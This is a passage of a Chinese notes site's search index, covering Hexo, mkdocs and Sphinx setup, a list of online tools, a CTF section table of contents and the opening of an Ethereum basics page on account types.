\u5c31\u53ef\u4ee5\u52a0\u5bc6\u8fd9\u7bc7\u6587\u7ae0\u3002\u66f4\u591a\u7528\u6cd5\u548c\u8bbe\u7f6e\u5728 GitHub \u4e0a\uff1a D0n9X1n/hexo-blog-encrypt</p>"},{"location":"cs/tools/hexo/#hexo-generator-indexarchivecategorytag","title":"hexo-generator-index/archive/category/tag","text":"<p>\u57fa\u672c\u662f\u5fc5\u987b\u8981\u88c5\u7684\u4e86\uff0c\u7528\u6765\u751f\u6210\u4e3b\u9875/\u5f52\u6863/\u5206\u7c7b/\u6807\u7b7e\u6587\u4ef6\u5939 <pre><code>index_generator:\n  path: ''\n  per_page: 10\n  order_by: '-date'\n\narchive_generator:\n  per_page: 30\n\ntag_generator:\n  per_page: 30\n\ncategory_generator:\n  per_page: 30\n</code></pre> \u5206\u522b\u7528\u6765\u6307\u5b9a\u5404\u4e2a\u9875\u9762\u6bcf\u4e2a\u9875\u9762\u7684\u6587\u7ae0\u4e2a\u6570</p>"},{"location":"cs/tools/hexo/#hexo-generator-feed","title":"hexo-generator-feed","text":"<p>\u7528\u6765\u751f\u6210 RSS \u8ba2\u9605 xml \u6587\u4ef6 <pre><code>feed:\n  enable: true\n  type: atom\n  path: atom.xml\n  limit: 20\n</code></pre></p>"},{"location":"cs/tools/hexo/#hexo-generator-index-pin-top","title":"hexo-generator-index-pin-top","text":"<p>\u7f6e\u9876\u67d0\u7bc7\u6587\u7ae0\uff0c\u53ea\u9700\u8981\u5728\u6587\u4ef6\u5934\u52a0\u4e0a <code>top: true</code> \u5373\u53ef</p> <p>\u4f46\u662f icarus \u4e3b\u9898\u597d\u50cf\u4e0d\u652f\u6301\u2026\u2026</p>"},{"location":"cs/tools/hexo/#hexo-generator-searchsearchdb","title":"hexo-generator-search/searchdb","text":"<p>\u7528\u6765\u751f\u6210\u641c\u7d22\u76f8\u5173 <pre><code>search:\n  path: search.xml\n  field: all\n  content: true\n  limit: 9999\n</code></pre></p>"},{"location":"cs/tools/hexo/#hexo-wordcount","title":"hexo-wordcount","text":"<p>\u7528\u6765\u751f\u6210\u5b57\u6570\u7edf\u8ba1\u3002\u597d\u50cf\u4e0d\u9700\u8981\u914d\u7f6e\u4ec0\u4e48</p>"},{"location":"cs/tools/hexo/#_5","title":"\u4e3b\u9898","text":"<p>\u73b0\u5728\u7684\u535a\u5ba2\u7528\u4e86\u4e00\u4e2a\u633a\u7b80\u6d01\u7684\u4e3b\u9898\uff0c ppoffice/hexo-theme-icarus</p> <p>\u4f46\u662f\u8fd9\u4e2a\u4e3b\u9898\u7684\u5f0a\u7aef\u4e5f\u633a\u591a\uff0c\u6bd4\u5982\u6240\u6709\u9875\u9762\u90fd\u4f1a\u52a0\u8f7d\u4e00\u4e2a content.json\uff0c\u91cc\u9762\u5b58\u653e\u4e86\u6574\u4e2a\u7f51\u7ad9\u7684\u6240\u6709\u6587\u7ae0\u5305\u62ec\u5185\u5bb9\uff0c\u5bfc\u81f4\u52a0\u8f7d\u5f88\u6162\uff08\u8822\u7684\u5f88\uff09</p> <p>\u6574\u4e2a\u4e3b\u9898\u57fa\u672c\u4e0a\u662f\u7528 jsx \u6765\u5199\u7684\uff0c\u6837\u5f0f\u662f\u7528 styl \u5199\u7684\uff0c\u6539\u7684\u8bdd\u8fd8\u6bd4\u8f83\u65b9\u4fbf</p> <p>\u6bd4\u5982\u589e\u52a0\u7f6e\u9876\u7684\u529f\u80fd\uff1a</p> \u7f6e\u9876 <p>\u6bcf\u7bc7\u6587\u7ae0\u7684 card \u548c\u5185\u5bb9\u9875\u9762\u90fd\u662f\u7531 <code>layout/common/article.jsx</code> \u6765\u751f\u6210</p> <p>\u6240\u4ee5\u76f4\u63a5\u5728 .card.level-left \u91cc\u9762\u52a0\uff1a <pre><code>{page.top &amp;&amp; &lt;span class=\"level-item\" style=\"color: #ff7242;\"&gt;\n&lt;i class=\"fas fa-thumbtack\" style=\"margin-right: 0.3em;\"&gt;&lt;/i&gt;\n\u7f6e\u9876&lt;/span&gt;}\n</code></pre> \u5c31\u53ef\u4ee5\u4e3a\u6587\u4ef6\u5934\u6709 top: true \u7684\u6587\u7ae0\u5728\u6700\u9876\u90e8\u6700\u5de6\u4fa7\u52a0\u4e0a\u7f6e\u9876\u6807\u5fd7</p> <p>\u800c\u4e14\u8fd9\u4e2a\u4e3b\u9898\u4e0d\u652f\u6301\u4ece\u914d\u7f6e\u6587\u4ef6\u548c\u5f53\u524d\u76ee\u5f55\u5d4c\u5165 js \u548c css\uff0c\u6240\u4ee5\u5c31\u76f4\u63a5\u53bb\u8fd9\u4e2a\u4e3b\u9898\u7684 <code>source</code> \u6587\u4ef6\u5939\u6539\u5c31\u597d\u4e86</p>"},{"location":"cs/tools/hexo/#reference","title":"Reference","text":"<ul> <li>Hexo \u5b98\u7f51</li> <li>zzq \u6d45\u8c08\u7528 Hexo+GitHub \u642d\u5efa\u81ea\u5df1\u7684 blog</li> <li>Hexo \u535a\u5ba2\u642d\u5efa\u8bf4\u660e\u4e66\uff08\u6307\u5317\u4e66\uff09</li> <li>\u4ece\u96f6\u642d\u5efa Hexo + Github \u535a\u5ba2</li> </ul>"},{"location":"cs/tools/mkdocs/","title":"mkdocs \u4f7f\u7528\u8bb0\u5f55","text":"<p> \u7ea6 556 \u4e2a\u5b57  22 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Abstract</p> <p>\u6211\u6700\u65e9\u63a5\u89e6\u7684\u7f51\u7ad9\u751f\u6210\u5668\u5c31\u662f mkdocs\uff0c\u7136\u540e\u7528\u5b83\u642d\u4e86\u535a\u5ba2\u3002\u4f46\u7531\u4e8e\u5f53\u65f6\u89c9\u5f97\u770b\u8d77\u6765\u592a\u5e73\u6de1\u3001\u529f\u80fd\u5c11\u7b49\u539f\u56e0\u629b\u5f03\u4e86\u5b83\u6362\u6210\u4e86 hexo \u540e\u6765\u6253\u7b97\u641e\u4e00\u4e2a\u7b14\u8bb0\u672c\u6574\u7406\u4e00\u4e9b\u6709\u4ef7\u503c\u7684\u5185\u5bb9\uff0c\u6240\u4ee5\u642d\u4e86\u8fd9\u4e2a\u7f51\u7ad9\uff0c\u7528\u56de\u4e86 mkdocs</p> <p>mkdocs \u5c31\u5f88\u9002\u5408\u7528\u6765\u505a\u8fd9\u79cd\u7ad9\u70b9\uff0c\u800c\u4e14\u5b83\u57fa\u4e8e python\uff0c\u4f7f\u7528 pymarkdown \u6e32\u67d3 markdown \u6587\u6863\uff0c\u6700\u540e\u4f7f\u7528 html \u6a21\u677f\u6e32\u67d3\uff0c\u4e5f\u5f88\u65b9\u4fbf\u4fee\u6539\u3002\u6240\u4ee5 mkdocs \u8fd8\u662f\u5f88\u9999\u7684</p>"},{"location":"cs/tools/mkdocs/#_1","title":"\u5b89\u88c5","text":"<p>mkdocs \u662f python \u7684\u4e00\u4e2a\u5305\uff0c\u76f4\u63a5 <code>pip install mkdocs</code> \u5c31\u53ef\u4ee5\u4e86</p>"},{"location":"cs/tools/mkdocs/#_2","title":"\u4f7f\u7528","text":"<p><pre><code>$ mkdocs new test    # \u521b\u5efa\u4e00\u4e2a\u540d\u4e3a test \u7684\u6587\u4ef6\u5939,\u5b58\u50a8\u4ee3\u7801\n$ cd test\n</code></pre> \u6b64\u65f6\u7684\u76ee\u5f55\u7ed3\u6784 <pre><code>test/\n \u251c\u2500\u2500 docs/            # \u5b58\u653emarkdown\u6587\u6863\n \u2502     \u2514\u2500\u2500 index.md   # \u4e3b\u9875\n \u2514\u2500\u2500 mkdocs.yml       # \u914d\u7f6e\u6587\u4ef6\n</code></pre> \u6253\u5f00\u5b9e\u65f6\u6e32\u67d3\u670d\u52a1\uff08\u9ed8\u8ba4\u7aef\u53e3 8000\uff09\uff0c\u5e76\u4e14\u4f7f\u7528 watchdog \u76d1\u63a7\u6587\u4ef6\u5939\u5185\u7684\u66f4\u6539 <pre><code>$ mkdocs serve\n</code></pre> \u5728\u6d4f\u89c8\u5668\u4e2d\u8f93\u5165 <code>127.0.0.1:8000</code> \u9884\u89c8\uff0c\u7ec8\u7aef\u952e\u5165 Ctrl+C \u5173\u95ed\u670d\u52a1\u5668 <pre><code>$ mkdocs build         # \u751f\u6210\u9759\u6001\u7f51\u9875\u4ee3\u7801\n</code></pre> \u8fd9\u65f6\u5df2\u7ecf\u751f\u6210\u4e86<code>site/</code>\u6587\u4ef6\u5939\uff0c\u53ef\u4ee5\u5c06\u91cc\u9762\u7684\u5185\u5bb9\u90e8\u7f72\u5230\u7f51\u7ad9\u4e0a\u4e86 <pre><code>$ mkdocs gh-deploy \n</code></pre> \u81ea\u52a8\u6839\u636e <code>mkdocs.yml</code> \u4e2d\u8bbe\u7f6e\u7684\u9879\u76ee\u5730\u5740\u90e8\u7f72\u5230 GitHub \u7684 gh-pages \u5206\u652f\u4e2d</p>"},{"location":"cs/tools/mkdocs/#_3","title":"\u914d\u7f6e\u6587\u4ef6","text":"<ul> <li><code>site_name</code>\uff1a\u5fc5\u586b\uff0c\u6587\u6863\u4e3b\u6807\u9898\u540d\u79f0</li> <li><code>site_url</code>\uff1a\u6700\u7ec8\u7684\u7f51\u7ad9 url</li> <li><code>repo_url</code>\uff1a\u5bf9\u5e94\u7684 GitHub repo \u7684\u94fe\u63a5\uff0c\u7528\u4e8e deploy \u548c\u53f3\u4e0a\u89d2\u7684\u94fe\u63a5</li> <li><code>edit_url</code>\uff1a\u76f8\u5bf9\u4e8e repo \u94fe\u63a5\u7684 docs \u76ee\u5f55\u5730\u5740</li> <li><code>site_description</code> \u7ad9\u70b9\u63cf\u8ff0</li> <li><code>copyright</code>\uff1a\u5de6\u4e0b\u89d2\u7248\u6743\u4fe1\u606f</li> <li><code>theme:</code>  \u4e3b\u9898\u6837\u5f0f\u4f8b\u5982:     <pre><code>theme: \n  name: 'material'     # \u4f7f\u7528material\u4e3b\u9898,\u9700\u8981pip\u5b89   \u88c5mkdocs-material\n  language: 'zh'       # \u4f7f\u7528\u4e2d\u6587\n  icon:\n    logo: ...          # \u5de6\u4e0a\u89d2\u7684 logo \n  custom_dir: ...      # \u7528\u4e8e\u8986\u76d6\u6a21\u677f\n  feature: \n    ...\n  font:                # \u5b57\u4f53\n    text: ...\n    code: ...\n  palette:\n    ... # \u914d\u8272\u65b9\u6848\n</code></pre></li> <li><code>markdown_extensions</code>\uff1a\u9700\u8981\u6dfb\u52a0\u7684 pymarkdown \u6269\u5c55\uff08\u5305\u5df2\u7ecf\u968f mkdocs \u9ed8\u8ba4\u5b89\u88c5\uff09\uff0c\u5177\u4f53\u5404\u79cd\u6269\u5c55\u7684\u7528\u6cd5\u770b\u5b98\u65b9\u6587\u6863</li> <li><code>extra</code>\uff1a\u4e3b\u9898\u9700\u8981\u7684\u5176\u4ed6\u914d\u7f6e\uff0c\u6bd4\u5982 material \u4e3b\u9898\u7684\u53f3\u4e0b\u89d2\u94fe\u63a5 <code>social</code> \u548c\u6d41\u91cf\u5206\u6790 <code>analytics</code> \u7684\u8bbe\u7f6e</li> <li><code>extra_css</code>\uff1a\u9644\u52a0\u7684 css \u6587\u4ef6\uff0c\u53ef\u4ee5\u662f url \u4e5f\u53ef\u4ee5\u662f\u76f8\u5bf9\u4e8e docs \u7684\u76f8\u5bf9\u8def\u5f84</li> <li><code>extra_javascript</code>\uff1a\u9644\u52a0\u7684 js \u6587\u4ef6\uff0c\u53ef\u4ee5\u662f url \u4e5f\u53ef\u4ee5\u662f\u76f8\u5bf9\u4e8e docs \u7684\u76f8\u5bf9\u8def\u5f84\u3002\u4f1a\u653e\u5230 body \u7684\u6700\u540e\uff0c\u5982\u679c\u9700\u8981\u653e\u5230 head \u91cc\u9700\u8981\u7528\u8986\u76d6\u6a21\u677f\u7684\u65b9\u5f0f</li> <li><code>plugins</code>\uff1a\u4e00\u4e9b\u63d2\u4ef6\uff0c\u6bd4\u5982\u641c\u7d22 <code>search</code>\uff0c\u663e\u793a\u6700\u8fd1\u4fee\u6539\u65f6\u95f4 <code>git-revision-date-localized</code></li> <li><code>nav</code>\uff1a\u76ee\u5f55\u7ed3\u6784</li> </ul> <p>\u672c\u7ad9\u7684\u914d\u7f6e\u6587\u6863\u5728\uff1ahttps://github.com/TonyCrane/note/blob/master/mkdocs.yml\uff0c\u53ef\u4f9b\u53c2\u8003</p> <p>\u5177\u4f53\u7684\u5404\u79cd\u7528\u6cd5\u8fd8\u662f\u770b\u5b98\u65b9\u6587\u6863\u6bd4\u8f83\u597d\uff0c\u5f88\u5168\u9762</p>"},{"location":"cs/tools/mkdocs/#reference","title":"Reference","text":"<ul> <li>mkdocs \u5b98\u65b9\u6587\u6863</li> <li>pymarkdown \u5185\u7f6e extensions</li> <li>pymdown-extensions \u6587\u6863</li> <li>mateial for mkdocs \u6587\u6863</li> <li>shafish.cn \u4e0a\u7684\u6559\u7a0b</li> </ul>"},{"location":"cs/tools/sphinx/","title":"Sphinx \u4f7f\u7528\u8bb0\u5f55","text":"<p> \u7ea6 264 \u4e2a\u5b57  4 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> <p>Abstract</p> <p>\u5bf9\u4e8e\u9879\u76ee\u6587\u6863\uff0cmkdocs \u770b\u8d77\u6765\u4e5f\u5f88\u8212\u9002\uff0c\u4f46\u662f\u8c8c\u4f3c\u4e0d\u80fd\u76f4\u63a5\u6839\u636e\u6587\u6863\u5b57\u7b26\u4e32\u6765\u751f\u6210\u6587\u6863\u3002\u800c\u540c\u6837\u57fa\u4e8e python \u7684 sphinx \u5c31\u5f88\u597d\u7528\uff0c\u5bf9\u4e8e python \u9879\u76ee\uff0c\u7528 sphinx \u6765\u751f\u6210\u6587\u6863\u8fd8\u662f\u5f88\u65b9\u4fbf\u7684</p>"},{"location":"cs/tools/sphinx/#_1","title":"\u5b89\u88c5","text":"<p>\u4f7f\u7528 <code>pip install Sphinx</code> \u901a\u8fc7 pip \u5b89\u88c5\u5373\u53ef </p>"},{"location":"cs/tools/sphinx/#_2","title":"\u4f7f\u7528","text":"<p>\u6587\u6863\uff1ahttps://www.sphinx-doc.org/en/master/usage/quickstart.html</p> <p>\u5b83\u548c mkdocs/hexo \u7684\u5dee\u522b\u8fd8\u662f\u5f88\u5927\u7684\uff0c\u6bd4\u5982\u914d\u7f6e\u6587\u4ef6\u662f python \u6587\u4ef6\u800c\u4e0d\u662f yml\uff0c\u9875\u9762\u6e90\u7801\u9ed8\u8ba4\u7528 rst\uff08reStructuredText\uff09\u800c\u4e0d\u662f markdown\uff0c\u5e76\u4e14\u751f\u6210\u6587\u6863\u662f\u4f7f\u7528 make html \u547d\u4ee4\u6765\u901a\u8fc7 Makefile \u6587\u4ef6\u7f16\u8bd1\u51fa\u6587\u6863</p>"},{"location":"cs/tools/sphinx/#_3","title":"\u751f\u6210\u6587\u6863","text":"<p>\u5982\u679c\u9879\u76ee\u5df2\u7ecf\u4f7f\u7528 rst \u8bed\u6cd5\u7f16\u5199\u597d\u4e86\u6587\u6863\u5b57\u7b26\u4e32\uff0c\u5219\u53ef\u4ee5\u76f4\u63a5\u63d0\u53d6\u51fa\u6765\u751f\u6210\u6587\u6863</p> <p>\u524d\u63d0\u662f\u9700\u8981\u5728 <code>conf.py</code> \u4e2d\u914d\u7f6e\u597d path </p> <p><pre><code>.. autoclass:: A.B.C \n    :members:\n</code></pre> \u5c31\u4f1a\u81ea\u52a8\u5bfc\u5165 A.B.C \u8fd9\u4e2a\u7c7b\uff0c\u5e76\u4e3a\u81ea\u8eab\u548c\u5b83\u6240\u6709\u7684\u5e26\u6709\u6587\u6863\u5b57\u7b26\u4e32\u7684\u65b9\u6cd5\u751f\u6210\u6587\u6863\u3002 <pre><code>.. automodule: A\n    :members:\n</code></pre> \u4f1a\u81ea\u52a8\u4e3a A \u8fd9\u4e2a\u6a21\u5757\u751f\u6210\u6587\u6863</p> <p>\u6587\u6863\uff1ahttps://www.sphinx-doc.org/en/master/usage/extensions/autodoc.html</p>"},{"location":"cs/tools/sphinx/#_4","title":"\u63d2\u4ef6","text":"<p>Sphinx \u8fd8\u53ef\u4ee5\u81ea\u5b9a\u4e49\u63d2\u4ef6\u3002\u6587\u6863\uff1ahttps://www.sphinx-doc.org/en/master/extdev/index.html#dev-extensions</p>"},{"location":"cs/tools/toolbox/","title":"\u5de5\u5177\u6536\u96c6","text":"<p> \u7ea6 359 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> <p>Abstract</p> <p>\u901b GitHub \u7b49\u7684\u65f6\u5019\u770b\u5230\u7684\u597d\u73a9\u7684/\u6709\u7528\u7684\u5de5\u5177\u6536\u96c6</p> <p>\u968f\u65f6\u66f4\u65b0\uff0c\u6b22\u8fce\u5728\u4e0b\u65b9\u8bc4\u8bba\u533a\u8865\u5145 (\uffe3\u25bd\uffe3)</p>"},{"location":"cs/tools/toolbox/#_2","title":"\u56fe\u7247\u7c7b","text":""},{"location":"cs/tools/toolbox/#_3","title":"\u4f5c\u56fe","text":"<ul> <li>\u5728\u7ebf\u624b\u5199\u98ce\u683c\u4f5c\u56fe\u767d\u677f Excalidraw</li> <li>\u5728\u7ebf\u77e2\u91cf\u56fe\u4f5c\u56fe\u8f6f\u4ef6\uff08draw.io\uff09app.diagrams.net</li> <li>\u5728\u7ebf\u56fe\u8bba\u4f5c\u56fe\u7f51\u7ad9 Graph Editor</li> <li>tikz \u6709\u9650\u72b6\u6001\u673a\u53ef\u89c6\u5316\u5236\u4f5c Finite State Machine Designer</li> </ul>"},{"location":"cs/tools/toolbox/#_4","title":"\u8bc6\u56fe","text":"<ul> <li>SauceNAO</li> </ul>"},{"location":"cs/tools/toolbox/#_5","title":"\u4fee\u6539\u56fe\u7247","text":"<ul> <li>\u79fb\u9664\u80cc\u666f\uff08\u5b8c\u5168\u514d\u8d39\uff09RemoveBg</li> <li>\u7eaf\u524d\u7aef\u514d\u8d39\u56fe\u7247\u538b\u7f29 PicDiet</li> <li>\u56fe\u7247\u538b\u7f29\uff08\u9700\u4e0a\u4f20\uff09DocSmall</li> <li>\u64e6\u9664\u56fe\u7247\u4e0a\u7269\u54c1\uff08\u514d\u8d39\u529f\u80fd\u53d7\u9650\uff09cleanup.pictures</li> </ul>"},{"location":"cs/tools/toolbox/#_6","title":"\u4ee3\u7801\u7c7b","text":""},{"location":"cs/tools/toolbox/#_7","title":"\u53ef\u89c6\u5316","text":"<ul> <li>\u6b63\u5219\u8868\u8fbe\u5f0f\u53ef\u89c6\u5316 Regulex</li> <li>Python \u6267\u884c\u8fc7\u7a0b\u53ef\u89c6\u5316 PythonTutor</li> <li>GLSL \u6d41\u4f53\u573a\u53ef\u89c6\u5316 Field Play</li> </ul>"},{"location":"cs/tools/toolbox/#_8","title":"\u7f16\u89e3\u7801","text":"<ul> <li>\u8d85\u5f3a\u591a\u5408\u4e00\u7f16\u89e3\u7801\u5de5\u5177 CyberChef</li> <li>\u4e09\u8bcd\u5730\u5740\uff08\u7528\u4e09\u4e2a\u5355\u8bcd\u7f16\u7801\u4e00\u4e2a\u5730\u70b9\uff09what3words</li> </ul>"},{"location":"cs/tools/toolbox/#_9","title":"\u5b66\u4e60\u5de5\u5177","text":"<ul> <li>\u7f13\u52a8\u66f2\u7ebf Easing Function Cheat Sheet</li> <li>\u591a\u7f16\u8bd1\u5668\u7f16\u8bd1\u7ed3\u679c\u6d4f\u89c8 Compiler Explorer</li> <li>\u5927 O \u590d\u6742\u5ea6\u6bd4\u8f83\u67e5\u8be2 Big O Cheat Sheet</li> <li>C \u7c7b\u578b\u58f0\u660e\u8f6c\u82f1\u6587\u63cf\u8ff0 cdecl</li> </ul>"},{"location":"cs/tools/toolbox/#_10","title":"\u8bbe\u8ba1\u7c7b","text":""},{"location":"cs/tools/toolbox/#_11","title":"\u914d\u8272","text":"<ul> <li>\u914d\u8272\u65b9\u6848\u7f51\u7ad9 Color Hunt</li> <li>\u914d\u8272\u65b9\u6848\u7f51\u7ad9\uff08\u5e26 Figma \u63d2\u4ef6\uff09 Coolors</li> <li>\u989c\u8272\u67e5\u627e\u53ca\u8f6c\u6362\u5de5\u5177 HexColor16</li> <li>\u65e5\u5f0f\u4f20\u7edf\u989c\u8272\u5217\u8868 Nippon Colors</li> <li>\u65e5\u7cfb\u989c\u8272\u540d\u79f0\u5217\u8868\uff08\u8272\u56fe\u7f51\u7ad9\uff09 Color Site</li> <li>Flat UI \u914d\u8272\u65b9\u6848 Flat UI Colors</li> </ul>"},{"location":"cs/tools/toolbox/#_12","title":"\u56fe\u6807","text":"<ul> <li>\u5404\u7cfb\u5217\u56fe\u6807\u5408\u96c6 icones</li> </ul>"},{"location":"cs/tools/toolbox/#_13","title":"\u6570\u5b66\u7c7b","text":"<ul> <li>\u6570\u5217\u67e5\u627e OEIS</li> </ul>"},{"location":"cs/tools/toolbox/#_14","title":"\u5176\u5b83","text":"<ul> <li>Emoji \u67e5\u8be2 EmojiAll</li> <li>ffmpeg \u6307\u4ee4\u751f\u6210 ffmpeg-commander</li> </ul>"},{"location":"ctf/","title":"CTF","text":"<p>Abstract</p> <p>\u8fd9\u91cc\u5f52\u6863\u4e00\u4e9b\u5728\u6253 CTF \u8fc7\u7a0b\u4e2d\u5b66\u4e60\u7684\u7b14\u8bb0</p> <p>\u76ee\u524d\u53ea\u4e3b\u653b misc\uff0c\u6240\u4ee5\u8fd9\u91cc\u6574\u7406\u7684\u5927\u90e8\u5206\u90fd\u662f misc \u7c7b\u7684\u5185\u5bb9\uff0c\u800c\u4e14\u8fd8\u6781\u4e0d\u5168\uff08\u9003</p> <p>\u5176\u4ed6\u65b9\u5411\u8fd8\u5728\u5b66\u4e60\u4e2dqwq</p>"},{"location":"ctf/#table-of-contents","title":"Table of Contents","text":"misc          <ul> <li> Steganography \u9690\u5199\u672f  919  69  3 mins              1677235505 </li> <li> Sandbox Escape \u6c99\u7bb1\u9003\u9038  1797  617  14 mins              1677235505 </li> <li> Forensic \u53d6\u8bc1  486  96  3 mins              1677235505 </li> <li> Coding &amp; Cipher \u7f16\u7801\u548c\u5bc6\u7801  286  1 mins              1677235505 </li> <li> QRCode \u4e8c\u7ef4\u7801\u89c4\u8303  6174  13  21 mins              1677235505 </li> <li> Esolang \u6df1\u5965\u7f16\u7a0b\u8bed\u8a00  278  106  2 mins              1677235505 </li> </ul> Blockchain          <ul> <li> Ethereum \u4ee5\u592a\u574a  17297  746  66 mins              1670067216 </li> </ul>"},{"location":"ctf/blockchain/","title":"\u533a\u5757\u94fe","text":"<p>Abstract</p> <p>\u533a\u5757\u94fe\u4e5f\u662f\u8fd1\u51e0\u5e74 misc \u5e38\u51fa\u7684\u4e00\u7c7b\u9898\u76ee\uff0c\u6709\u65f6\u4e5f\u4f1a\u5355\u72ec\u5206\u533a\u3002\u5176\u4e2d\u5927\u90e8\u5206\u662f\u5173\u4e8e\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u7684\u3002</p> <p>2022 \u5e74\u521d\u6211\u5f00\u59cb\u63a5\u89e6\u8fd9\u7c7b\u9898\u76ee\uff0c\u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e9b\u603b\u7ed3\u4e4b\u7c7b\u7684\u4e1c\u897f\u3002</p>"},{"location":"ctf/blockchain/#table-of-contents","title":"Table of Contents","text":"<ul> <li>Ethereum \u4ee5\u592a\u574a<ul> <li>\u4ee5\u592a\u574a\u57fa\u7840</li> <li>\u4ee5\u592a\u574a\u865a\u62df\u673a</li> <li>Solidity \u8bed\u8a00</li> <li>Yul \u8bed\u8a00</li> <li>\u5e38\u89c1\u5408\u7ea6\u6f0f\u6d1e\u653b\u51fb\u624b\u6bb5</li> <li>ERC \u6807\u51c6</li> <li>\u5176\u4f59\u91cd\u8981 EIPs</li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/","title":"Ethereum \u4ee5\u592a\u574a","text":"<p>Abstract</p> <p>ETH \u662f\u533a\u5757\u94fe\u9898\u76ee\u4e2d\u6700\u5e38\u89c1\u7684\u4e00\u7c7b\u4e86\uff0cCTF \u4e2d\u4e3b\u8981\u6d89\u53ca\u667a\u80fd\u5408\u7ea6\u7684\u5b89\u5168\u95ee\u9898\u3002</p> <p>\u6211\u4f1a\u7684 ETH \u77e5\u8bc6\u57fa\u672c\u90fd\u5199\u5728\u8fd9\u91cc\u4e86\u3002</p>"},{"location":"ctf/blockchain/eth/#table-of-contents","title":"Table of Contents","text":"<ul> <li>\u4ee5\u592a\u574a\u57fa\u7840</li> <li>\u4ee5\u592a\u574a\u865a\u62df\u673a</li> <li>Solidity \u8bed\u8a00</li> <li>Yul \u8bed\u8a00</li> <li>\u5e38\u89c1\u5408\u7ea6\u6f0f\u6d1e\u653b\u51fb\u624b\u6bb5</li> <li>ERC \u6807\u51c6</li> <li>\u5176\u4f59\u91cd\u8981 EIPs</li> </ul>"},{"location":"ctf/blockchain/eth/basic/","title":"\u4ee5\u592a\u574a\u57fa\u7840","text":"<p> \u7ea6 3056 \u4e2a\u5b57  88 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 11 \u5206\u949f</p> <p>Abstract</p> <p>\u4e00\u4e9b ETH \u9898\u76ee\u4e2d\u4f1a\u7528\u5230\u7684\u4ee5\u592a\u574a\u57fa\u7840\u77e5\u8bc6</p>"},{"location":"ctf/blockchain/eth/basic/#_2","title":"\u57fa\u7840\u73af\u5883","text":"<ul> <li>Remix\uff1a\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6 IDE</li> <li>MetaMask\uff1a\u4ee5\u592a\u574a\u94b1\u5305</li> <li>Etherscan\uff1a\u4ee5\u592a\u574a\u533a\u5757\u94fe\u6d4f\u89c8\u5668</li> <li>geth\uff1a\u4ea4\u4e92\u5de5\u5177</li> </ul>"},{"location":"ctf/blockchain/eth/basic/#_3","title":"\u8d26\u6237","text":"<p>\u4ee5\u592a\u574a\u4e2d\u7684\u8d26\u6237\uff08Account\uff09\u5206\u4e3a\u4e24\u7c7b\uff0c\u5206\u522b\u662f\u5916\u90e8\u8d26\u6237\uff08Externally Owned Account, EOA\uff09\u548c\u5408\u7ea6\u8d26\u6237\uff08Contract Account\uff09\u3002</p> <ul> <li>\u5916\u90e8\u8d26\u6237<ul> <li>\u7531\u4eba\u521b\u5efa\u7684\uff0c\u76f8\u5f53\u4e8e\u94b1\u5305\uff0c\u53ef\u4ee5\u5b58\u50a8\u4ee5\u592a\u5e01\uff0c\u53d1\u9001\u4ea4\u6613\u7b49</li> <li>\u6bcf\u4e2a\u5916\u90e8\u8d26\u6237\u90fd\u6709\u4e00\u5bf9\u516c\u79c1\u94a5\uff0c\u7528\u4e8e\u7b7e\u7f72\u4ea4\u6613\u7b49<ul> <li>\u79c1\u94a5\u662f\u4e00\u4e2a 256 \u4f4d\u6570\uff0832 \u5b57\u8282\uff09</li> <li>\u516c\u94a5\u7531\u79c1\u94a5\u7ecf ECDSA \u8ba1\u7b97\u800c\u6765\uff0c\u662f\u4e00\u4e2a 64 \u5b57\u8282\u7684\u6570</li> <li>\u5730\u5740\u662f\u516c\u94a5\u8ba1\u7b97 keccak256 \u54c8\u5e0c\u540e\u53d6\u540e 20 \u5b57\u8282\u7684\u503c\uff08\u4e00\u822c\u8868\u793a\u4e3a 0x + 40 \u4e2a\u5341\u516d\u8fdb\u5236\u5b57\u7b26\uff09</li> </ul> </li> </ul> </li> <li>\u5408\u7ea6\u8d26\u6237<ul> <li>\u5408\u7ea6\u8d26\u6237\u662f\u7531\u5916\u90e8\u8d26\u6237\u901a\u8fc7\u4ea4\u6613\u521b\u5efa\u7684\u8d26\u6237\uff0c\u5176\u4e2d\u5305\u542b\u5408\u7ea6\u4ee3\u7801</li> <li>\u5408\u7ea6\u5730\u5740<ul> <li>CREATE \u64cd\u4f5c\u7801\uff1a\u901a\u8fc7\u521b\u5efa\u8005\u5730\u5740\u3001\u4ea4\u6613\u7684 nonce \u503c\u5171\u540c\u8ba1\u7b97 keccak256 \u54c8\u5e0c\u5f97\u5230</li> <li>CREATE2 \u64cd\u4f5c\u7801\uff08\u541b\u58eb\u5766\u4e01\u5821\u786c\u5206\u53c9\u540e\uff09\uff1a\u901a\u8fc7\u521b\u5efa\u8005\u5730\u5740\u3001\u76d0\u503c\u3001\u5408\u7ea6\u521b\u5efa\u4ee3\u7801\u8ba1\u7b97\u5f97\u5230</li> </ul> </li> <li>\u5408\u7ea6\u8d26\u6237\u540c\u6837\u4e5f\u53ef\u4ee5\u5b58\u50a8\u3001\u62e5\u6709\u4ee5\u592a\u5e01</li> <li>\u5411\u4e00\u4e2a\u5408\u7ea6\u8d26\u6237\u53d1\u9001\u4ea4\u6613\u76f8\u5f53\u4e8e\u8c03\u7528\u5408\u7ea6\u4e2d\u7684\u51fd\u6570</li> <li>\u5408\u7ea6\u8d26\u6237\u4e0d\u80fd\u81ea\u884c\u53d1\u8d77\u4ea4\u6613\uff0c\u4f46\u53ef\u4ee5\u5728\u88ab\u8c03\u7528\u65f6\u5411\u5916\u53d1\u9001\u4ea4\u6613</li> </ul> </li> </ul> <p>\u8fd9\u4e24\u7c7b\u8d26\u6237\u90fd\u662f \u201c\u72b6\u6001\u5bf9\u8c61\u201d\uff0c\u4e00\u4e2a\u4ee5\u592a\u574a\u8d26\u6237\u5305\u542b\uff1a</p> <ul> <li>nonce\uff1a\u5df2\u7ecf\u53d1\u9001\u7684\u4ea4\u6613\u6570\u91cf</li> <li>balance\uff1a\u8d26\u6237\u4f59\u989d\uff0c\u5373\u5b58\u50a8\u7684\u4ee5\u592a\u5e01\u6570\u91cf</li> 